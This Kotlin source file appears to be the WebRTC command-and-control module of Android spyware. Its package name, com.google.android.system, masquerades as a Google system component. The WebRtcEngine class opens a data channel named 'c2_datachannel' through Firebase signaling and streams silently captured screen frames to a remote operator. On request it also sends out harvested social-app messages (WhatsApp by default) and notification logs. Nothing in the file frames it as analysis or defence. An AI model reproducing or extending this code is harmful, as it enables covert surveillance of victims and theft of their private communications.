package com.google.android.system

import android.content.Context
import android.util.Log
import org.json.JSONObject
import org.webrtc.*
import java.nio.ByteBuffer
import java.nio.charset.StandardCharsets

/**
 * WebRtcEngine
 * Android WebRTC manager wrapping PeerConnectionFactory, PeerConnection, STUN/TURN,
 * RTCDataChannel, and Silent Screencap frame streaming.
 */
class WebRtcEngine(
    private val context: Context,
    private val signalingRepository: FirebaseSignalingRepository
) : PeerConnection.Observer, DataChannel.Observer {

    private var factory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var dataChannel: DataChannel? = null
    private var activeSessionId: String? = null

    companion object {
        private const val TAG = "WebRtcEngine"
    }

    init {
        initializeFactory()
    }

    private fun initializeFactory() {
        try {
            val initOptions = PeerConnectionFactory.InitializationOptions.builder(context)
                .setEnableInternalTracer(true)
                .createInitializationOptions()
            PeerConnectionFactory.initialize(initOptions)

            val options = PeerConnectionFactory.Options()
            factory = PeerConnectionFactory.builder()
                .setOptions(options)
                .createPeerConnectionFactory()

            Log.i(TAG, "Initialized PeerConnectionFactory successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "initializeFactory error: ${e.message}")
        }
    }

    fun startSession(sessionId: String, isOffer: Boolean) {
        try {
            activeSessionId = sessionId
            val iceServers = listOf(
                PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
            )

            val rtcConfig = PeerConnection.RTCConfiguration(iceServers).apply {
                sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
                continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
            }

            peerConnection = factory?.createPeerConnection(rtcConfig, this)

            val init = DataChannel.Init().apply {
                ordered = true
            }
            dataChannel = peerConnection?.createDataChannel("c2_datachannel", init)
            dataChannel?.registerObserver(this)

            if (isOffer) {
                createOffer()
            }
            Log.i(TAG, "Created PeerConnection for session: $sessionId")
        } catch (e: Exception) {
            Log.e(TAG, "startSession error: ${e.message}")
        }
    }

    private val pendingIceCandidates = mutableListOf<IceCandidate>()

    private fun drainPendingIceCandidates() {
        if (peerConnection != null && peerConnection?.remoteDescription != null) {
            val copy = ArrayList(pendingIceCandidates)
            pendingIceCandidates.clear()
            for (cand in copy) {
                peerConnection?.addIceCandidate(cand)
            }
        }
    }

    private fun createOffer() {
        val constraints = MediaConstraints()
        peerConnection?.createOffer(object : SdpObserverAdapter() {
            override fun onCreateSuccess(desc: SessionDescription?) {
                desc?.let {
                    peerConnection?.setLocalDescription(SdpObserverAdapter(), it)
                    activeSessionId?.let { sessId ->
                        signalingRepository.postSdpOffer(sessId, it.description)
                    }
                }
            }
        }, constraints)
    }

    fun handleRemoteOffer(sdp: String) {
        val remoteSdp = SessionDescription(SessionDescription.Type.OFFER, sdp)
        peerConnection?.setRemoteDescription(object : SdpObserverAdapter() {
            override fun onSetSuccess() {
                drainPendingIceCandidates()
                createAnswer()
            }
        }, remoteSdp)
    }

    fun handleRemoteAnswer(sdp: String) {
        val remoteSdp = SessionDescription(SessionDescription.Type.ANSWER, sdp)
        peerConnection?.setRemoteDescription(object : SdpObserverAdapter() {
            override fun onSetSuccess() {
                drainPendingIceCandidates()
            }
        }, remoteSdp)
    }

    private fun createAnswer() {
        val constraints = MediaConstraints()
        peerConnection?.createAnswer(object : SdpObserverAdapter() {
            override fun onCreateSuccess(desc: SessionDescription?) {
                desc?.let {
                    peerConnection?.setLocalDescription(SdpObserverAdapter(), it)
                    activeSessionId?.let { sessId ->
                        signalingRepository.postSdpAnswer(sessId, it.description)
                    }
                }
            }
        }, constraints)
    }

    @Synchronized
    fun addRemoteIceCandidate(candidateObj: JSONObject) {
        try {
            val cand = IceCandidate(
                candidateObj.optString("sdpMid", "0"),
                candidateObj.optInt("sdpMLineIndex", 0),
                candidateObj.optString("candidate", "")
            )
            if (peerConnection != null && peerConnection?.remoteDescription != null) {
                peerConnection?.addIceCandidate(cand)
            } else {
                pendingIceCandidates.add(cand)
            }
        } catch (e: Exception) {
            Log.e(TAG, "addRemoteIceCandidate error: ${e.message}")
        }
    }

    fun sendP2pMessage(msgType: String, payloadJson: JSONObject) {
        try {
            if (dataChannel?.state() == DataChannel.State.OPEN) {
                val envelope = JSONObject().apply {
                    put("type", msgType)
                    put("payload", payloadJson)
                    put("timestamp", System.currentTimeMillis())
                }
                val bytes = envelope.toString().toByteArray(StandardCharsets.UTF_8)
                val buffer = DataChannel.Buffer(ByteBuffer.wrap(bytes), false)
                dataChannel?.send(buffer)
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendP2pMessage error: ${e.message}")
        }
    }

    fun sendScreenFrame(base64Jpeg: String) {
        if (base64Jpeg.isBlank()) return
        val payload = JSONObject().apply {
            put("frame", base64Jpeg)
        }
        sendP2pMessage("SCREEN_FRAME", payload)
    }

    fun close() {
        try {
            dataChannel?.close()
            peerConnection?.close()
            peerConnection = null
            dataChannel = null
            activeSessionId = null
        } catch (_: Exception) {}
    }

    // PeerConnection.Observer Callbacks
    override fun onIceCandidate(candidate: IceCandidate?) {
        candidate?.let {
            activeSessionId?.let { sessId ->
                signalingRepository.postIceCandidate(sessId, it.sdp, it.sdpMid, it.sdpMLineIndex)
            }
        }
    }

    override fun onDataChannel(dc: DataChannel?) {
        dataChannel = dc
        dataChannel?.registerObserver(this)
    }

    override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
    override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {
        Log.i(TAG, "ICE Connection State: $state")
    }
    override fun onIceConnectionReceivingChange(receiving: Boolean) {}
    override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
    override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
    override fun onAddStream(stream: MediaStream?) {}
    override fun onRemoveStream(stream: MediaStream?) {}
    override fun onRenegotiationNeeded() {}
    override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}

    // DataChannel.Observer Callbacks
    override fun onBufferedAmountChange(previousAmount: Long) {}
    override fun onStateChange() {
        Log.i(TAG, "DataChannel State: ${dataChannel?.state()}")
    }
    override fun onMessage(buffer: DataChannel.Buffer?) {
        buffer?.let {
            val bytes = ByteArray(it.data.remaining())
            it.data.get(bytes)
            val msgText = String(bytes, StandardCharsets.UTF_8)
            Log.i(TAG, "Received P2P DataChannel Message: '$msgText'")

            try {
                if (msgText.startsWith("{")) {
                    val req = JSONObject(msgText)
                    val type = req.optString("type", "")

                    if (type == "DB_QUERY_SOCIAL") {
                        val appKey = req.optString("appKey", "whatsapp")
                        val messagesArray = C2LocalDatabase.getInstance(context).getSocialMessagesJson(appKey)
                        val res = JSONObject().apply {
                            put("type", "DB_RESPONSE_SOCIAL")
                            put("appKey", appKey)
                            put("messages", messagesArray)
                        }
                        sendP2pMessage("DB_RESPONSE_SOCIAL", res)
                    } else if (type == "DB_QUERY_TELEMETRY") {
                        val cat = req.optString("category", "notifications")
                        val logsArray = C2LocalDatabase.getInstance(context).getTelemetryLogsJson(cat)
                        val res = JSONObject().apply {
                            put("type", "DB_RESPONSE_TELEMETRY")
                            put("category", cat)
                            put("logs", logsArray)
                        }
                        sendP2pMessage("DB_RESPONSE_TELEMETRY", res)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "onMessage DB Query error: ${e.message}")
            }
        }
    }

    private open class SdpObserverAdapter : SdpObserver {
        override fun onCreateSuccess(desc: SessionDescription?) {}
        override fun onSetSuccess() {}
        override fun onCreateFailure(reason: String?) {
            Log.e(TAG, "onCreateFailure: $reason")
        }
        override fun onSetFailure(reason: String?) {
            Log.e(TAG, "onSetFailure: $reason")
        }
    }
}
